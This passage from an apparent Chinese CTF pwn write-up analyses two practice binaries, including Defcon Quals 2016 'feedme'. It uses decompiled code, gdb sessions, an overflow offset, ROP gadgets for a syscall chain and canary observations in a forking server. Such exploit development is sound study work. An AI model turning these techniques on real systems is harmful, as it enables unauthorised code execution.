FUN_00400b60(uVar5,param_2,param_3,param_4,param_5,param_6,param_7,param_8,pcVar4,pcVar3,</span><br><span class="line">               extraout_RDX_01,pfVar2,in_R8,in_R9);</span><br><span class="line">  FUN_00400bae(pcVar4,pcVar3,extraout_RDX_02,pfVar2,(<span class="type">long</span>)in_R8,in_R9);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看起来可能有点复杂可能是因为是静态链接的;<code>FUN_00400b4d</code>输出Hello brave new challenger,<code>FUN_00400b60</code>这里控制的部分包括<code>Any last words?</code>、<code>This will be the last thing that you say: i don't want to die here.</code>和输入部分，<code>FUN_00400bae</code>打印结束语，看到控制输入部分的函数<code>FUN_004498a0</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">undefined8 <span class="title function_">FUN_004498a0</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  uint uVar1;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> (DAT_006bc80c == <span class="number">0</span>) &#123;</span><br><span class="line">    syscall();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  uVar1 = FUN_0044be40();</span><br><span class="line">  syscall();</span><br><span class="line">  FUN_0044bea0((ulong)uVar1);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里进行了系统调用，查看汇编代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">004498aa 31 c0           XOR        EAX,EAX</span><br><span class="line">004498ac 0f 05           SYSCALL</span><br></pre></td></tr></table></figure><p>在调用syscall系统调用的时候，rax里面的值会决定调用什么函数，这里xor进行了寄存器清空<br />优化了一下反编译终于能看了，这里IDA就很好了，没有杂项参数影响函数分析，但是用不惯拓展性也不高</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">FUN_00400b60</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  undefined local_408 [<span class="number">1024</span>];</span><br><span class="line">  </span><br><span class="line">  FUN_00410390(<span class="string">&quot;Any last words?&quot;</span>);</span><br><span class="line">  FUN_004498a0(<span class="number">0</span>,(<span class="type">char</span>)local_408,<span class="number">0xd0</span>);</span><br><span class="line">  FUN_0040f710((float10 *)<span class="string">&quot;This will be the last thing that you say: %s\n&quot;</span>,local_408);</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>或者也可以gdb调试查看我们究竟可以溢出多少的字节大小</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">00400b77 48 8d 85        LEA        RAX=&gt;local_408,[RBP + -0x400]</span><br><span class="line">         00 fc ff ff</span><br><span class="line">00400b7e ba d0 07        MOV        EDX,0x7d0</span><br><span class="line">         00 00</span><br><span class="line">00400b83 48 89 c6        MOV        RSI,RAX</span><br><span class="line">00400b86 bf 00 00        MOV        param_9,0x0</span><br><span class="line">         00 00</span><br><span class="line">00400b8b e8 10 8d        CALL       FUN_004498a0 </span><br><span class="line">         04 00</span><br></pre></td></tr></table></figure><p>我们在<code>00400b8b</code>函数运行完毕设置断点也就是<code>00400b90</code>，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">gef➤  search-pattern 2710560</span><br><span class="line">[+] Searching &#x27;2710560&#x27; in memory</span><br><span class="line">[+] In &#x27;[stack]&#x27;(0x7ffffffde000-0x7ffffffff000), permission=rw-</span><br><span class="line">  0x7fffffffd910 - 0x7fffffffd919  →   &quot;2710560\n&quot; </span><br><span class="line">gef➤  i f</span><br><span class="line">Stack level 0, frame at 0x7fffffffdd20:</span><br><span class="line"> rip = 0x400b90; saved rip = 0x400c1d</span><br><span class="line"> called by frame at 0x7fffffffdd40</span><br><span class="line"> Arglist at 0x7fffffffd908, args: </span><br><span class="line"> Locals at 0x7fffffffd908, Previous frame&#x27;s sp is 0x7fffffffdd20</span><br><span class="line"> Saved registers:</span><br><span class="line">  rbp at 0x7fffffffdd10, rip at 0x7fffffffdd18</span><br><span class="line">gef➤  pi print(hex(0x7fffffffdd18-0x7fffffffd910))</span><br><span class="line">0x408</span><br></pre></td></tr></table></figure><p>这里的<code>2710560</code>就是自己输入的内容,得到结果<code>0x408</code><br />通过ROPgadget得到我们要<code>syscall</code>需要控制的寄存器</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0x0000000000415664 : pop rax ; ret</span><br><span class="line">0x0000000000400686 : pop rdi ; ret</span><br><span class="line">0x00000000004101f3 : pop rsi ; ret</span><br><span class="line">0x00000000004498b5 : pop rdx ; ret</span><br><span class="line">0x000000000048d251 : mov qword ptr [rax], rdx ; ret</span><br></pre></td></tr></table></figure><p>syscall地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x000000000040129c : syscall</span><br></pre></td></tr></table></figure><p><code>/bin/sh</code>的十六进制形式<code>0x2f62696e2f73680</code></p><h2 id="defcon-quals-2016-feedme"><a class="markdownIt-Anchor" href="#defcon-quals-2016-feedme"></a> Defcon Quals 2016 feedme</h2><p>文件下载: <a href="/cyber/pwn/defconfeedme2016">defconfeedme2016</a>，到这里是第一次接触这种fork类型的，记录记录；先来看看checksec</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    No RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p>看看程序运行状态</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">FEED ME!</span><br><span class="line">aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</span><br><span class="line">ATE 61616161616161616161616161616161...</span><br><span class="line">*** stack smashing detected ***: ./feedme terminated</span><br><span class="line">Child exit.</span><br><span class="line">FEED ME!</span><br><span class="line">bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb   </span><br><span class="line">ATE 6161616161616161610a626262626262...</span><br><span class="line">*** stack smashing detected ***: ./feedme terminated</span><br><span class="line">Child exit.</span><br><span class="line">FEED ME!</span><br><span class="line">bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb</span><br><span class="line">ATE 62626262626262626262626262626262...</span><br><span class="line">*** stack smashing detected ***: ./feedme terminated</span><br><span class="line">Child exit.</span><br><span class="line">FEED ME!</span><br></pre></td></tr></table></figure><p>目前有点疑惑的是第二和第三次我们输入的数据是一样的，但是得到的反馈不是一样的，不过这个时候已经可以看到很强的关联性了</p><p>接下来找需要分析的函数，可以找到<code>strings</code>存储<code>FEED ME!</code>地址里面的xfer就可以来到相关函数（手动优化后）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">uint <span class="title function_">feedFunction</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  byte bVar1;</span><br><span class="line">  undefined *puVar1;</span><br><span class="line">  uint result;</span><br><span class="line">  <span class="type">int</span> in_GS_OFFSET;</span><br><span class="line">  undefined input [<span class="number">32</span>];</span><br><span class="line">  <span class="type">int</span> canary;</span><br><span class="line">  </span><br><span class="line">  canary = *(<span class="type">int</span> *)(in_GS_OFFSET + <span class="number">0x14</span>);</span><br><span class="line">  <span class="built_in">puts</span>((uint *)<span class="string">&quot;FEED ME!&quot;</span>);</span><br><span class="line">  bVar1 = FUN_08048e42();</span><br><span class="line">  FUN_08048e7e(input,(uint)bVar1);</span><br><span class="line">  puVar1 = FUN_08048f6e((<span class="type">int</span>)input,bVar1,<span class="number">0x10</span>);</span><br><span class="line">  <span class="built_in">printf</span>((uint *)<span class="string">&quot;ATE %s\n&quot;</span>,(<span class="type">char</span>)puVar1);</span><br><span class="line">  result = (uint)bVar1;</span><br><span class="line">  <span class="keyword">if</span> (canary != *(<span class="type">int</span> *)(in_GS_OFFSET + <span class="number">0x14</span>)) &#123;</span><br><span class="line">    result = FUN_0806f5b0();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里引入一下gef的<code>follow-fork-mode</code>，以下为帮助说明；这里为什么认定是child子程序，是因为canary一般被修改程序会直接输出*** stack smashing detected ***，但是这里不断修改不断提示，可以初步猜测进行了fork，我们访问的是主程序fork下来的子程序，出错后重复这一过程</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Set debugger response to a program call of fork or vfork.</span><br><span class="line">A fork or vfork creates a new process.  follow-fork-mode can be:</span><br><span class="line">  parent  - the original process is debugged after a fork</span><br><span class="line">  child   - the new process is debugged after a fork</span><br><span class="line">The unfollowed process will continue to run.</span><br><span class="line">By default, the debugger will follow the parent process.</span><br></pre></td></tr></table></figure><p>简单来说程序调用fork后，debug会默认调试父程序，如果手动设置<code>set follow-fork-mode child</code>就会切换这一模式，那么接下来就进行gdb调试(目前还有三个函数不知道有啥用我们断点看看<code>FUN_08048e42</code>,<code>FUN_08048e7e</code>,<code>FUN_08048f6e</code>)<code>FUN_0806f5b0</code>函数负责输出canary被修改的提示<br />首先根据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><span class="line">gef➤  i b</span><br><span class="line">Num     Type           Disp Enb Address    What</span><br><span class="line">1       breakpoint     keep y   0x08049053  inf 5</span><br><span class="line">breakpoint already hit 1 time</span><br><span class="line">2       breakpoint     keep y   0x08049069  inf 5</span><br><span class="line">3       breakpoint     keep y   0x08049084  inf 5</span><br><span class="line">gef➤  r</span><br><span class="line">Child exit.</span><br><span class="line">FEED ME!</span><br><span class="line">Starting program: /home/andy/Workspace/buuctf_pwn/feedme2016/feedme </span><br><span class="line">[*] Failed to find objfile or not a valid file format: [Errno 2] No such file or directory: &#x27;system-supplied DSO at 0xf7ffc000&#x27;</span><br><span class="line">[Attaching after process 3694 fork to child process 3695]</span><br><span class="line">[New inferior 6 (process 3695)]</span><br><span class="line">[Detaching after fork from parent process 3694]</span><br><span class="line">[Inferior 5 (process 3694) detached]</span><br><span class="line">[*] Failed to find objfile or not a valid file format: [Errno 2] No such file or directory: &#x27;system-supplied DSO at 0xf7ffc000&#x27;</span><br><span class="line">gef➤  FEED ME!</span><br><span class="line">[Switching to process 3695]</span><br><span class="line"></span><br><span class="line">Thread 6.1 &quot;feedme&quot; hit Breakpoint 1, 0x08049053 in ?? ()</span><br><span class="line"></span><br><span class="line">[ Legend: Modified register | Code | Heap | Stack | String ]</span><br><span class="line">─────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────</span><br><span class="line">$eax   : 0x9       </span><br><span class="line">$ebx   : 0x80481a8  →   push ebx</span><br><span class="line">$ecx   : 0x80eb4d4  →  0x00000000</span><br><span class="line">$edx   : 0x9       </span><br><span class="line">$esp   : 0xffffcf00  →  0x80be70c  →  &quot;FEED ME!&quot;</span><br><span class="line">$ebp   : 0xffffcf48  →  0xffffcf78  →  0xffffcf98  →  0x8049970  →   push ebx</span><br><span class="line">$esi   : 0x0       </span><br><span class="line">$edi   : 0x80ea00c  →  0x8066130  →   mov edx, DWORD PTR [esp+0x4]</span><br><span class="line">$eip   : 0x8049053  →  0xfffdeae8  →  0x00000000</span><br><span class="line">$eflags: [zero carry parity adjust SIGN trap INTERRUPT direction overflow resume virtualx86 identification]</span><br><span class="line">$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63 </span><br><span class="line">─────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────</span><br><span class="line">0xffffcf00│+0x0000: 0x80be70c  →  &quot;FEED ME!&quot; ← $esp</span><br><span class="line">0xffffcf04│+0x0004: 0x00000000</span><br><span class="line">0xffffcf08│+0x0008: 0x00000000</span><br><span class="line">0xffffcf0c│+0x000c: 0x806ccb7  →   sub esp, 0x20</span><br><span class="line">0xffffcf10│+0x0010: 0x80ea200  →   xchg DWORD PTR [eax], ebp</span><br><span class="line">0xffffcf14│+0x0014: 0x80ea247  →   or dl, ah</span><br><span class="line">0xffffcf18│+0x0018: 0x80ea248  →  0x80eb4d4  →  0x00000000</span><br><span class="line">0xffffcf1c│+0x001c: 0x00000000</span><br><span class="line">───────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────</span><br><span class="line">    0x8049045                  xor    eax, eax</span><br><span class="line">    0x8049047                  mov    DWORD PTR [esp], 0x80be70c</span><br><span class="line">    0x804904e                  call   0x804fc60</span><br><span class="line">●→  0x8049053                  call   0x8048e42</span><br><span class="line">   ↳   0x8048e42                  push   ebp</span><br><span class="line">       0x8048e43                  mov    ebp, esp</span><br><span class="line">       0x8048e45                  sub    esp, 0x28</span><br><span class="line">       0x8048e48                  mov    DWORD PTR [esp+0x8], 0x1</span><br><span class="line">       0x8048e50                  lea    eax, [ebp-0xd]</span><br><span class="line">       0x8048e53                  mov    DWORD PTR [esp+0x4], eax</span><br><span class="line">───────────────────────────────────────────────────────────────────────────────────────────────── arguments (guessed) ────</span><br><span class="line">0x8048e42 (</span><br><span class="line">)</span><br><span class="line">───────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────</span><br><span class="line">[#0] Id 1, Name: &quot;feedme&quot;, stopped 0x8049053 in ?? (), reason: BREAKPOINT</span><br><span class="line">─────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────</span><br><span class="line">[#0] 0x8049053 → call 0x8048e42</span><br><span class="line">[#1] 0x80490dc → movzx eax, al</span><br><span class="line">[#2] 0x80491da → mov eax, 0x0</span><br><span class="line">[#3] 0x80493ba → mov DWORD PTR [esp], eax</span><br><span class="line">[#4] 0x8048d2b → hlt </span><br><span class="line">──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">i b</span><br><span class="line">Num     Type           Disp Enb Address    What</span><br><span class="line">1       breakpoint     keep y   0x08049053  inf 6</span><br><span class="line">breakpoint already hit 1 time</span><br><span class="line">2       breakpoint     keep y   0x08049069  inf 6</span><br><span class="line">3       breakpoint     keep y   0x08049084  inf 6</span><br><span class="line">gef➤  nexti</span><br><span class="line">2710560</span><br><span class="line">0x08049058 in ?? ()</span><br><span class="line"></span><br><span class="line">[ Legend: Modified register | Code | Heap | Stack | String ]</span><br><span class="line">─────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────</span><br><span class="line">$eax   : 0x32      </span><br><span class="line">$ebx   : 0x80481a8  →   push ebx</span><br><span class="line">$ecx   : 0xffffceeb  →  0x00000132</span><br><span class="line">$edx   : 0x1       </span><br><span class="line">$esp   : 0xffffcf00  →  0x80be70c  →  &quot;FEED ME!&quot;</span><br><span class="line">$ebp   : 0xffffcf48  →  0xffffcf78  →  0xffffcf98  →  0x8049970  →   push ebx</span><br><span class="line">$esi   : 0x0       </span><br><span class="line">$edi   : 0x80ea00c  →  0x8066130  →   mov edx, DWORD PTR [esp+0x4]</span><br><span class="line">$eip   : 0x8049058  →   mov BYTE PTR [ebp-0x2d], al</span><br><span class="line">$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]</span><br><span class="line">$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63 </span><br><span class="line">─────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────</span><br><span class="line">0xffffcf00│+0x0000: 0x80be70c  →  &quot;FEED ME!&quot; ← $esp</span><br><span class="line">0xffffcf04│+0x0004: 0x00000000</span><br><span class="line">0xffffcf08│+0x0008: 0x00000000</span><br><span class="line">0xffffcf0c│+0x000c: 0x806ccb7  →   sub esp, 0x20</span><br><span class="line">0xffffcf10│+0x0010: 0x80ea200  →   xchg DWORD PTR [eax], ebp</span><br><span class="line">0xffffcf14│+0x0014: 0x80ea247  →   or dl, ah</span><br><span class="line">0xffffcf18│+0x0018: 0x80ea248  →  0x80eb4d4  →  0x00000000</span><br><span class="line">0xffffcf1c│+0x001c: 0x00000000</span><br><span class="line">───────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────</span><br><span class="line">    0x8049047                  mov    DWORD PTR [esp], 0x80be70c</span><br><span class="line">    0x804904e                  call   0x804fc60</span><br><span class="line">●   0x8049053                  call   0x8048e42</span><br><span class="line"> →  0x8049058                  mov    BYTE PTR [ebp-0x2d], al</span><br><span class="line">    0x804905b                  movzx  eax, BYTE PTR [ebp-0x2d]</span><br><span class="line">    0x804905f                  mov    DWORD PTR [esp+0x4], eax</span><br><span class="line">    0x8049063                  lea    eax, [ebp-0x2c]</span><br><span class="line">    0x8049066                  mov    DWORD PTR [esp], eax</span><br><span class="line">●   0x8049069                  call   0x8048e7e</span><br><span class="line">───────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────</span><br><span class="line">[#0] Id 1, Name: &quot;feedme&quot;, stopped 0x8049058 in ?? (), reason: SINGLE STEP</span><br><span class="line">─────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────</span><br><span class="line">[#0] 0x8049058 → mov BYTE PTR [ebp-0x2d], al</span><br><span class="line">[#1] 0x80490dc → movzx eax, al</span><br><span class="line">[#2] 0x80491da → mov eax, 0x0</span><br><span class="line">[#3] 0x80493ba → mov DWORD PTR [esp], eax</span><br><span class="line">[#4] 0x8048d2b → hlt </span><br><span class="line">──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">gef➤  710560</span><br><span class="line">Undefined command: &quot;710560&quot;.  Try &quot;help&quot;.</span><br><span class="line">gef➤  print $al</span><br><span class="line">$4 = 0x32</span><br></pre></td></tr></table></figure><p>这一部分调试内容我们得知了函数<code>FUN_08048e42</code>获取了我们输入内容(字符串)的第一个字符，那么我们将其命名为<code>getInt()</code>，继续调试</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gef➤  You ran out of time, closing!</span><br></pre></td></tr></table></figure><blockquote><p>设置了alarm，由于不能用<code>sed -i s/alarm/isnan/g ./Program</code>的土方法了，还好时间限制完全可以够我们调试完毕，所以暂时可以放一放这个问题</p></blockquote><p>后面调试都差不多，放上来太碍眼了；发现<code>FUN_08048e7e</code>可以根据函数<code>getInt()</code>得到的ascii值来决定我们可以在<code>input</code>开始写入多少内容</p><blockquote><p>这里我重新调试了一下，直观一点于是用了ascii码为<code>0x30</code>的字符<code>0</code></p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">gef➤  AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">Undefined command: &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;.  Try &quot;help&quot;.</span><br><span class="line">gef➤  x/w $esp</span><br><span class="line">0xffffcf00:0xffffcf1c</span><br><span class="line">gef➤  x/40w 0xffffcf1c</span><br><span class="line">0xffffcf1c:0x414141410x414141410x414141410x41414141</span><br><span class="line">0xffffcf2c:0x414141410x414141410x414141410x41414141</span><br><span class="line">0xffffcf3c:0x414141410x414141410x414141410x41414141</span><br><span class="line">0xffffcf4c:0x80490dc0x80ea0a00x00x80ed840</span><br><span class="line">0xffffcf5c:0x804f8b40x00x00x0</span><br><span class="line">0xffffcf6c:0x80481a80x80481a80x00xffffcf98</span><br><span class="line">0xffffcf7c:0x80491da0x80ea0a00x00x2</span><br><span class="line">0xffffcf8c:0x00x00x80ea00c0x8049970</span><br><span class="line">0xffffcf9c:0x80493ba0x10xffffd0240xffffd02c</span><br><span class="line">0xffffcfac:0x00x00x80481a80x0</span><br><span class="line">gef➤  </span><br></pre></td></tr></table></figure><p><code>FUN_08048f6e</code>返回值是指向我们输入内容转换为ascii码+'…'字符串的指针，不知道什么原因我这边调试这一部分的时候会疯狂弹出<code>__kernel_vsyscall</code>的相关问题，所以我只好覆盖刚好为32字节大小的内容，这样我们才能够看到canary，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">gef➤  x/40 0xffffcf1c</span><br><span class="line">0xffffcf1c:0x414141410x414141410x414141410x41414141</span><br><span class="line">0xffffcf2c:0x414141410x414141410x414141410x41414141</span><br><span class="line">0xffffcf3c:0x49e68b000x00x80ea00c0xffffcf78</span><br><span class="line">0xffffcf4c:0x80490dc0x80ea0a00x00x80ed840</span><br><span class="line">0xffffcf5c:0x804f8b40x00x00x0</span><br><span class="line">0xffffcf6c:0x80481a80x80481a80x00xffffcf98</span><br><span class="line">0xffffcf7c:0x80491da0x80ea0a00x00x2</span><br><span class="line">0xffffcf8c:0x00x00x80ea00c0x8049970</span><br><span class="line">0xffffcf9c:0x80493ba0x10xffffd0240xffffd02c</span><br><span class="line">0xffffcfac:0x00x00x80481a80x0</span><br></pre></td></tr></table></figure><p>摸清楚了子程序的漏洞利用我们需要查看主程序，直接<code>bt</code>查看回溯，可以看到主程序函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __regparm3 <span class="title function_">real_main</span><span class="params">(<span class="type">int</span> **param_1)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  uint uVar1;</span><br><span class="line">  <span class="type">int</span> local_1c;</span><br><span class="line">  uint count;</span><br><span class="line">  uint local_14;</span><br><span class="line">  uint local_10;</span><br><span class="line">  </span><br><span class="line">  local_1c = <span class="number">0</span>;</span><br><span class="line">  count = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span>( <span class="literal">true</span> ) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">799</span> &lt; count) &#123;</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    local_14 = FUN_0806cc70(param_1);</span><br><span class="line">    <span class="keyword">if</span> (local_14 == <span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line">    local_10 = FUN_0806cbe0(local_14,&amp;local_1c,<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (local_10 == <span class="number">0xffffffff</span>) &#123;</span><br><span class="line">      <span class="built_in">puts</span>((uint *)<span class="string">&quot;Wait error!&quot;</span>);</span><br><span class="line">      FUN_0804ed20(<span class="number">0xffffffff</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (local_1c == <span class="number">-1</span>) &#123;</span><br><span class="line">      <span class="built_in">puts</span>((uint *)<span 